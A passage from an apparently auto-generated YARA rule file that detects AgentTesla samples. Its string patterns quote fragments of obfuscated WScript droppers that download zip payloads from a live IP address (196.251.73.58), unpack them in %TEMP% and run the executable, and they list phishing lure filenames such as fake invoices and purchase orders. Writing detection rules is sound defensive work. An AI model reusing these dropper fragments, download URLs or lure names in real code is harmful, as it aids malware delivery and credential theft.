      hash1 = "050f48be2fe4d6be9d7d2d89c861d94f1ece46ec5b244e05c9f20f9e40b44e76"
   strings:
      $s1 = "function a(){var x=['t3bLBG','nZi1ode3EwjTwxnQ','rxHWyw5Krw52AxjVBM1LBNrtDhjPBMDZ','mJe0mJy4nLD2zhzbyG','mdeYmZq1nJC4owfIy2rLzMD" ascii /* score: '14.00'*/
      $s2 = "}}}(a,0x52205),(function(){var s=b,c=WScript[s(0x12e)]('WScript.Shell'),d=WScript[s(0x12e)](s(0x11f)),f=c[s(0x10b)](s(0x12c)),g=" ascii /* score: '12.00'*/
      $s3 = "0x1,q[u(0x109)](),q['Write'](p[u(0x122)]),q['SaveToFile'](o,0x2),q[u(0x12b)](),!![];}function l(n,o){var v=s,p=WScript['CreateOb" ascii /* score: '10.00'*/
      $s4 = "slice'](-0x2);}return decodeURIComponent(p);};b['ecbFXn']=i,c=arguments,b['AOkvWM']=!![];}var j=e[0x0],k=f+j,l=c[k];return!l?(h=" ascii /* score: '9.00'*/
      $s5 = "+/=';var o='',p='';for(var q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__05218afc {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_05218afc.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "05218afca2f276e19b268d78dde3185374d9112c2ef8597a68efe308b0a59853"
   strings:
      $s1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x14d,'bvf5'))/0x1+-parseInt(r(0x140,'Leyg'))/0x2*(parseInt(r(0x1" ascii /* score: '19.00'*/
      $s2 = "')yj$')),d=WScript[s(0x151,'pk24')](s(0x13f,'ypJ&')),f=c[s(0x14e,'OKAQ')](s(0x154,'OKAQ')),g=s(0x13a,'nQr]'),h=d[s(0x12d,'rs[L')" ascii /* score: '10.00'*/
      $s3 = "';var p='',q='';for(var r=0x0,s,t,u=0x0;t=n['charAt'](u++);~t&&(s=r%0x4?s*0x40+t:t,r++%0x4)?p+=String['fromCharCode'](0xff&s>>(-" ascii /* score: '9.00'*/
      $s4 = "ce'](-0x2);}return decodeURIComponent(q);};var m=function(n,o){var p=[],q=0x0,r,t='';n=i(n);var u;for(u=0x0;u<0x100;u++){p[u]=u;" ascii /* score: '9.00'*/
      $s5 = "!CU')](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)[w(0x125,'MV1i')]);while(!o['atEnd']()){var p=o['it" ascii /* score: '9.00'*/
      $s6 = "8oywmoDWPpcTCogvdvWW597wIRcIcZcHLlcK8oPE8kHW5zUWPZdTraCWOFdMG','bKf4xLNdNKOVl1xcTdO','WQddSmk5asOuFchdMCkYW6aOWPS'];a=function()" ascii /* score: '9.00'*/
      $s7 = ",'vcy2')](o,0x2),q[u(0x134,'y!CU')](),!![];}function l(n,o){var v=s,p=WScript['CreateObject']('Shell.Application'),q=p[v(0x142,'" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 10KB and
      all of them
}

rule AgentTesla_signature__78ec8d1a {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_78ec8d1a.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "78ec8d1ab7e05c335f8fb75768654bc4900d1bdd6924249f1a2189581f308181"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "P.O. for W2025.exe" fullword ascii /* score: '16.00'*/
      $s3 = "KefXf:\"" fullword ascii /* score: '10.00'*/
      $s4 = "icPpp- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 5000KB and
      all of them
}

rule AgentTesla_signature__8cae8fcd {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_8cae8fcd.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8cae8fcd76331fead56370275ea6e435652af1232ee2e8c2e920971de75d172b"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "Delivery note & Invoice.exe" fullword ascii /* score: '19.00'*/
      $s3 = "icPpp- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 6000KB and
      all of them
}

rule AgentTesla_signature__97a4c62f {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_97a4c62f.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97a4c62f070ca9128c9e662b8a906627a8b73ce0f7ffe26a8921bea77576e565"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "d Przelewu.exe" fullword ascii /* score: '19.00'*/
      $s3 = "msedge_elf.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "ohdbjfnaiemc" fullword ascii /* score: '8.00'*/
      $s5 = "d Przelewu.exePK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule AgentTesla_signature__d04c0a34 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_d04c0a34.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d04c0a34077840d5fb0c69a152d1d2ec3813a0a5c552bfde3589281cd45f7895"
   strings:
      $s1 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s2 = "buy order PO.exe" fullword ascii /* score: '19.00'*/
      $s3 = "fnnfnf" fullword ascii /* reversed goodware string 'fnfnnf' */ /* score: '15.00'*/
      $s4 = "XeYE^OB" fullword ascii /* score: '9.00'*/
      $s5 = "TDUo /W7" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 6000KB and
      all of them
}

rule AgentTesla_signature__0b5c80cc {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_0b5c80cc.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b5c80cc3d7eb1d7d7ca75b67cb9013d278fd2de0dcbb03cc3cd85eccb0fe982"
   strings:
      $s1 = "(function(c,d){var J={c:0x8b,d:0x9b,e:0x8c,f:0x73,g:0x98,h:0x75},r=b,s=b,t=b,e=c();while(!![]){try{var f=-parseInt(r(0x86))/0x1*" ascii /* score: '19.00'*/
      $s2 = "K={c:0x7d},u=b,v=b,w=b,c=WScript[u(0x9a)]('WScript.Shell'),d=WScript[v(O.c)]('Scripting.FileSystemObject'),f=c[u(O.d)](w(0x9e))," ascii /* score: '12.00'*/
      $s3 = "[G(N.g)](q),p[G(N.h)](),c[H(N.i)]('\\x22'+q+'\\x22',0x1,![]);break;}o[H(N.j)]();}}try{k(g,h)&&(l(h,i)&&(WScript[u(0x94)](0x5dc)," ascii /* score: '10.00'*/
      $s4 = "x0,v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['i" ascii /* score: '9.00'*/
      $s5 = "eturn p['NameSpace'](o)[F(M.e)](q[D(M.f)](),0x14),!![];}function m(n){var G=w,H=w,I=w,o=new Enumerator(d['GetFolder'](n)['Files'" ascii /* score: '9.00'*/
      $s6 = "arAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0){s=n['indexOf'](s);}for(var u=0" ascii /* score: '9.00'*/
      $s7 = "n l(n,o){var D=v,E=v,F=w,p=WScript[D(M.c)]('Shell.Application'),q=p[D(0x78)](n);if(!q)return![];if(!d[F(M.d)](o))d[E(0x87)](o);r" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 9KB and
      all of them
}

rule AgentTesla_signature__17cdf5b4 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_17cdf5b4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "17cdf5b4c5b8a8ad52e3d03c50bd55015a905466d96d8afc3bc911345bd2b7ce"
   strings:
      $s1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=parseInt(r(0x167))/0x1+parseInt(r(0x166))/0x2+parseInt(r(0x148))/0x3*(-parseI" ascii /* score: '22.00'*/
      $s2 = "cripting.FileSystemObject'),f=c[s(0x13d)](s(0x157)),g=s(0x15c),h=d[s(0x141)](f,j(0x6)+'.zip'),i=d[s(0x141)](f,j(0x6));function j" ascii /* score: '13.00'*/
      $s3 = "q['Write'](p['responseBody']),q[u(0x164)](o,0x2),q[u(0x162)](),!![];}function l(n,o){var v=s,p=WScript[v(0x163)](v(0x15b)),q=p[v" ascii /* score: '10.00'*/
      $s4 = "CodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['KYLxxR']=i,c=arguments,b['dhvhjU']=!![];}var j=" ascii /* score: '9.00'*/
      $s5 = " m(n){var w=s,o=new Enumerator(d[w(0x15f)](n)[w(0x142)]);while(!o['atEnd']()){var p=o[w(0x160)]();if(d['GetExtensionName'](p[w(0" ascii /* score: '9.00'*/
      $s6 = "EFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var o='',p='';for(var q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__f5bfbcb2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f5bfbcb2.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5bfbcb21c93459f79fe9dd51b10db6a396803054d6b5e8fa9ee2af82a1d477d"
   strings:
      $s1 = "New Orders.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      all of them
}

rule AgentTesla_signature__4a41ecd2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4a41ecd2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a41ecd2e7b8d3aa939024998e8261f3bf77281b6d73ea7baa2efb3404d0d9ab"
   strings:
      $s1 = "function a(){var x=['zxHL','tvnytuWYlLHnteHuvfa','tMfTzvnWywnL','zMXVB3i','C2vUza','mtyXntu1nhHJAKTzua','u2XLzxa','Bw92zu5LEhq'," ascii /* score: '27.00'*/
      $s2 = "eateObject'](s(0x19d)),d=WScript[s(0x197)](s(0x185)),f=c[s(0x19a)](s(0x179)),g='http://196.251.73.58/host/Stein.zip',h=d['BuildP" ascii /* score: '26.00'*/
      $s3 = "),q[u(0x192)](p[u(0x19e)]),q[u(0x187)](o,0x2),q['Close'](),!![];}function l(n,o){var v=s,p=WScript['CreateObject'](v(0x193)),q=p" ascii /* score: '10.00'*/
      $s4 = "eAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['vyRfUj']=i,c=arguments,b['PPbGUj']=!![];}var j=e[0" ascii /* score: '9.00'*/
      $s5 = "HIJKLMNOPQRSTUVWXYZ0123456789+/=';var o='',p='';for(var q=0x0,r,s,t=0x0;s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=S" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__4a4e0c12 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4a4e0c12.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4a4e0c126d9df520429e95f381ba45c7cfb2bb1928a108f069535ac4392078b5"
   strings:
      $x1 = "function a(){var x=['CMvZCg9UC2vcB2r5','AxrLBq','BgvUz3rO','yxrfBMq','nfbYu1n0vW','mtiWodGZmtbnsMXQsKq','ntC0otq0yKjyAMPh','Dg9m" ascii /* score: '44.00'*/
      $x2 = "Script.Shell'),d=WScript[s(0xda)](s(0xe1)),f=c[s(0xc2)]('%TEMP%'),g='http://196.251.73.58/host/MEXXXXX.zip',h=d[s(0xc9)](f,j(0x6" ascii /* score: '42.00'*/
      $s3 = "0xd1)){var q=d[w(0xc9)](n,j(0x7)+'.exe');p['Copy'](q),p[w(0xbd)](),c['Run']('\\x22'+q+'\\x22',0x1,![]);break;}o[w(0xbf)]();}}try" ascii /* score: '14.00'*/
      $s4 = ",q['SaveToFile'](o,0x2),q[u(0xc3)](),!![];}function l(n,o){var v=s,p=WScript['CreateObject'](v(0xce)),q=p['NameSpace'](n);if(!q)" ascii /* score: '10.00'*/
      $s5 = " Enumerator(d[w(0xbc)](n)['Files']);while(!o[w(0xd5)]()){var p=o[w(0xd3)]();if(d['GetExtensionName'](p[w(0xc5)])[w(0xd9)]()===w(" ascii /* score: '9.00'*/
      $s6 = "u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['fNakRS']=i,c=arguments" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__a31862fa {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_a31862fa.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a31862fa3c8b010485241999d4bea4bc605687cc3f37e3653f686add5497a395"
   strings:
      $s1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x13f;var h=e[f];if(b['xKAFDx']===undefined){var i=function(m){var n='abcde" ascii /* score: '30.00'*/
      $s2 = ",f=c['ExpandEnvironmentStrings']('%TEMP%'),g='http://196.251.73.58/H2/Stein.zip',h=d[s(0x167)](f,j(0x6)+s(0x148)),i=d[s(0x167)](" ascii /* score: '26.00'*/
      $s3 = "t']());}}}(a,0x44ac3),(function(){var s=b,c=WScript[s(0x141)]('WScript.Shell'),d=WScript[s(0x141)]('Scripting.FileSystemObject')" ascii /* score: '12.00'*/
      $s4 = "=0x1,q[u(0x166)](),q[u(0x146)](p[u(0x14a)]),q[u(0x15e)](o,0x2),q[u(0x14f)](),!![];}function l(n,o){var v=s,p=WScript[v(0x141)](v" ascii /* score: '10.00'*/
      $s5 = "u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['Dcjvmz']=i,c=arguments" ascii /* score: '9.00'*/
      $s6 = "+=o['charAt'](Math['floor'](Math[t(0x168)]()*o[t(0x15a)]));}return p;}function k(n,o){var u=s,p=new ActiveXObject('MSXML2.XMLHTT" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__4c92199d {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4c92199d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c92199d0fc59441c280dd2f9d5f35f10f1d995ceda78b1ee2003438ef168036"
   strings:
      $s1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x156))/0x1*(parseInt(r(0x134))/0x2)+parseInt(r(0x135))/0x3+-pars" ascii /* score: '24.00'*/
      $s2 = "['shift']());}}}(a,0x9257e),(function(){var s=b,c=WScript[s(0x150)](s(0x13f)),d=WScript[s(0x150)](s(0x147)),f=c[s(0x151)]('%TEMP" ascii /* score: '17.00'*/
      $s3 = "),p['Delete'](),c[w(0x14f)]('\\x22'+q+'\\x22',0x1,![]);break;}o[w(0x159)]();}}try{k(g,h)&&(l(h,i)&&(WScript['Sleep'](0x5dc),m(i)" ascii /* score: '10.00'*/
      $s4 = "q[u(0x142)]=0x1,q['Open'](),q[u(0x13d)](p[u(0x133)]),q[u(0x146)](o,0x2),q['Close'](),!![];}function l(n,o){var v=s,p=WScript['Cr" ascii /* score: '10.00'*/
      $s5 = "(o)[v(0x139)](q[v(0x131)](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)['Files']);while(!o[w(0x155)]())" ascii /* score: '9.00'*/
      $s6 = "v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['IEAt" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__4eb49057 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_4eb49057.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4eb490571dfd5f0727d78b9e350e16a59d7555b5cfc78fe9bd01b6611ca138b7"
   strings:
      $s1 = "draft bill of lading.exe" fullword ascii /* score: '19.00'*/
      $s2 = "JoEi:\"t" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__5318a20b {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_5318a20b.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5318a20b4246511fa56c36708577757a33880a2bf5da0e7f58a716a3a05c5b0b"
   strings:
      $s1 = "* j02_4" fullword ascii /* score: '9.00'*/
      $s2 = "COrNE /U-" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 5000KB and
      all of them
}

rule AgentTesla_signature__89879f12 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_89879f12.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "89879f12721f2e3b035e25d496c30d20096904df3042aebb164467ae3aafbedc"
   strings:
      $s1 = "PO24S1458(SEQ 2).exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__8d937a80 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_8d937a80.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d937a80bd15d75dc14a3b2d40c7cd9249f8d5e2fcc53b9cc8636226d01d2b78"
   strings:
      $s1 = "function _0x2cc8(){var _0x254b89=['AxrLBq','q3jLyxrLt2jQzwn0','rgvSzxrL','vhLWzq','v1nJCMLWDc5tAgvSBa','mZa5ndGWzfjxr2Td','nZG5n" ascii /* score: '22.00'*/
      $s2 = "ction(){var _0x33edfb=_0x220b,_0x34631e=WScript[_0x33edfb(0x1e6)](_0x33edfb(0x1e9)),_0x15ed84=WScript[_0x33edfb(0x1e6)]('Scripti" ascii /* score: '10.00'*/
      $s3 = "tion _0x1f5e23(_0x13186d,_0x8c05f6){var _0xda7096=_0x33edfb,_0x140a68=WScript[_0xda7096(0x1e6)](_0xda7096(0x203)),_0x50ed0c=_0x1" ascii /* score: '10.00'*/
      $s4 = "f0a0[_0x5f4578(0x1f4)]();}}try{_0x3f3b35(_0x2c9cd2,_0x5cb178)&&(_0x1f5e23(_0x5cb178,_0x28ba1a)&&(WScript['Sleep'](0x5dc),_0x59de" ascii /* score: '10.00'*/
      $s5 = "f831='',_0x2c9cd2='';for(var _0x5cb178=0x0,_0x28ba1a,_0x3e82d7,_0x3f3b35=0x0;_0x3e82d7=_0x34631e['charAt'](_0x3f3b35++);~_0x3e82" ascii /* score: '9.00'*/
      $s6 = "decodeURIComponent(_0x2c9cd2);};_0x220b['xiMucL']=_0x59eb21,_0x4a22b4=arguments,_0x220b['IksAAq']=!![];}var _0x11b574=_0x2cc8f0[" ascii /* score: '9.00'*/
      $s7 = "_0x2b9826[_0x4a86d6(0x1f1)]('GET',_0x51b41d,![]),_0x2b9826[_0x4a86d6(0x206)]();if(_0x2b9826[_0x4a86d6(0x209)]!==0xc8)return![];v" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      all of them
}

rule AgentTesla_signature__9451f574 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_9451f574.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9451f5742874d27c9eb688de5ad0531f02fc6ca61deab442eab6ac2571b18dd5"
   strings:
      $s1 = "PO-ROWA-6005525.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__a4bb1fcb {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_a4bb1fcb.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4bb1fcb0209caf2fd91c9146bae76b513a84c6986ea9ad418408ec2db441b8d"
   strings:
      $s1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=parseInt(r(0x95))/0x1+parseInt(r(0x86))/0x2+parseInt(r(0x91))/0x3+parseInt(r(" ascii /* score: '22.00'*/
      $s2 = ")](s(0x9c)),d=WScript['CreateObject'](s(0x80)),f=c[s(0xa0)]('%TEMP%'),g=s(0xa6),h=d[s(0xa5)](f,j(0x6)+s(0x8e)),i=d[s(0xa5)](f,j(" ascii /* score: '21.00'*/
      $s3 = ");p[w(0xa4)](q),p[w(0x93)](),c[w(0x90)]('\\x22'+q+'\\x22',0x1,![]);break;}o[w(0x9a)]();}}try{k(g,h)&&(l(h,i)&&(WScript[s(0x8b)](" ascii /* score: '10.00'*/
      $s4 = "['Close'](),!![];}function l(n,o){var v=s,p=WScript[v(0x81)](v(0x8c)),q=p[v(0xa1)](n);if(!q)return![];if(!d[v(0x8a)](o))d['Creat" ascii /* score: '10.00'*/
      $s5 = "var u=0x0,v=o['length'];u<v;u++){p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p)" ascii /* score: '9.00'*/
      $s6 = "s=m['charAt'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?o+=String['fromCharCode'](0xff&r>>(-0x2*q&0x6)):0x0){s=n['indexOf'](s);}for(" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__d6ebb977 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_d6ebb977.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6ebb9777c197f74a028ed2bef5e5450a3f4cdb5a7f9e8bdb2e462ba5e2cc0b8"
   strings:
      $x1 = "function _0x135e(_0x2d04f7,_0xa97e30){var _0x3e4a52=_0x3e4a();return _0x135e=function(_0x135e64,_0x328876){_0x135e64=_0x135e64-0" ascii /* score: '32.00'*/
      $s2 = "6ca=_0x5a59e4[_0x22cb7b('0x16b')](_0x22cb7b('0x183')),_0x4f8662='http://196.251.73.58/host/Stein.zip',_0x4ec584=_0x1b2da5[_0x22c" ascii /* score: '16.00'*/
      $s3 = "')](),!![];}function _0x9aeb8c(_0x438343,_0x245c34){var _0x50429b=_0x22cb7b,_0xe1b44c=WScript[_0x50429b('0x160')](_0x50429b('0x1" ascii /* score: '10.00'*/
      $s4 = "b=_0x135e,_0x5a59e4=WScript['CreateObject'](_0x22cb7b('0x17e')),_0x1b2da5=WScript[_0x22cb7b('0x160')](_0x22cb7b('0x174')),_0x124" ascii /* score: '10.00'*/
      $s5 = "a['charCodeAt'](_0x9aeb8c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4f8662);};_0x135e['LhPwRO']=_0x3ea233" ascii /* score: '9.00'*/
      $s6 = "32d6bb)[_0x3200df('0x176')]);while(!_0x3c380f['atEnd']()){var _0x1cd6f2=_0x3c380f[_0x3200df('0x184')]();if(_0x1b2da5['GetExtensi" ascii /* score: '9.00'*/
      $s7 = "4f7eb,_0x3f402=0x0;_0x34f7eb=_0x5a59e4['charAt'](_0x3f402++);~_0x34f7eb&&(_0x4eb86d=_0x4ec584%0x4?_0x4eb86d*0x40+_0x34f7eb:_0x34" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f1102657 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f1102657.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f11026574c1ad05a8eb43f8a267b8dc11ce7f981f32a4c72f0675e6141e898f4"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0xf6;var h=e[f];return h;},b(c,d);}function a(){var x=['1071245jqjCnW','3PY" ascii /* score: '39.00'*/
      $s2 = "aCMl','floor','Scripting.FileSystemObject','BuildPath','Run','charAt','%TEMP%','ExpandEnvironmentStrings','ADODB.Stream','.zip'," ascii /* score: '29.00'*/
      $s3 = "),d=WScript['CreateObject'](s(0x112)),f=c[s(0x117)](s(0x116)),g='http://196.251.73.58/H2/JAY.zip',h=d['BuildPath'](f,j(0x6)+s(0x" ascii /* score: '21.00'*/
      $s4 = "286826AQmXYK','atEnd','Type','CopyHere','63nEELPp','length','open','GetFolder','NameSpace','status','WScript.Shell','1817836EIPZ" ascii /* score: '17.00'*/
      $s5 = "'random','responseBody','GetExtensionName','Open','Close','MSXML2.XMLHTTP','1819090DuYXPf','430024JDvkAC','exe','CreateObject','" ascii /* score: '12.00'*/
      $s6 = "IC','0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ','CreateFolder','GET','14zQUxqb','574174crDFJY','.exe','9178" ascii /* score: '11.00'*/
      $s7 = "q['SaveToFile'](o,0x2),q[u(0x11e)](),!![];}function l(n,o){var v=s,p=WScript[v(0xf8)](v(0x10d)),q=p[v(0x101)](n);if(!q)return![]" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__14d1adfd {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_14d1adfd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "14d1adfdb3561245ae1f15a2073ac852c84a5ab0436b74cca8d8a5b7994fdd77"
   strings:
      $s1 = "Uznapm.exe" fullword wide /* score: '22.00'*/
      $s2 = "DUznapm, Version=1.0.4934.10532, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "Ptkisirc" fullword ascii /* score: '11.00'*/
      $s4 = "* ,);n" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__81ab1d02 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_81ab1d02.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "81ab1d02d4b818c925ba44d35d4cd1bbaacc5ef63539ae7fde7d232b95420dae"
   strings:
      $s1 = "Zixdzwg.exe" fullword wide /* score: '22.00'*/
      $s2 = "EZixdzwg, Version=1.0.3808.13478, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "get_Ibezoldtjj" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__92cd5b81 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_92cd5b81.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "92cd5b811f58f0fab4637e26b23e09780af5b3ad197c68eb05fdf480706e9e06"
   strings:
      $s1 = "Dkrnsrcevxr.exe" fullword wide /* score: '22.00'*/
      $s2 = "IDkrnsrcevxr, Version=1.0.8498.19787, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s3 = "get_Hzdorjrzw" fullword ascii /* score: '9.00'*/
      $s4 = "Udzggqbbinm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__fa7f2500 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_fa7f2500.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fa7f25009a5586a0d89d826374a89e156b26dd2b16da0d130399d00bf6474177"
   strings:
      $s1 = "Dry-Dock Specifications.exe" fullword ascii /* score: '15.00'*/
      $s2 = "* id@d\"" fullword ascii /* score: '9.00'*/
      $s3 = "kjlI]~!." fullword ascii /* score: '8.00'*/
      $s4 = "nfXU* ." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__faf6b7f0 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_faf6b7f0.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faf6b7f002db4600d009a35de56dfed56352856432fdb2513516befabf200a70"
   strings:
      $s1 = "modecrypt.exe" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      all of them
}

rule AgentTesla_signature__fc41f312 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_fc41f312.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fc41f31238dfa8fec9dd426bb02d4863e0de3282b1711d3eef25cd9671ed0410"
   strings:
